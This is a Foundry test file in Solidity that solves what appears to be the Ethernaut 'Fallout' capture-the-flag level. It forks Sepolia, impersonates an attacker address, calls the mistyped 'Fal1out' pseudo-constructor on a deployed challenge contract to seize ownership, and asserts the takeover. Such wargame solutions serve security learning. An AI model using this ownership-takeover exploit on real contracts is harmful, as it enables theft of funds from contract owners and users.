// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

interface IFal1out {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
}

contract TestFal1out is Test {
    
    address constant private TARGET_ADDRESS = 0x6ADe51B1C8Fc77cbD2C89393b013650d14E9e6d9;
    IFal1out target;
    address attacker; 


    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = IFal1out(TARGET_ADDRESS);
        attacker = makeAddr("attacker");
    }

    function testFal1out() public {
        // Arrange
        vm.prank(attacker);

        // Act
        target.Fal1out{value: 0 wei}();

        // Assert
        // 1. Claim ownership
        assertEq(target.owner() , attacker);
    }

}



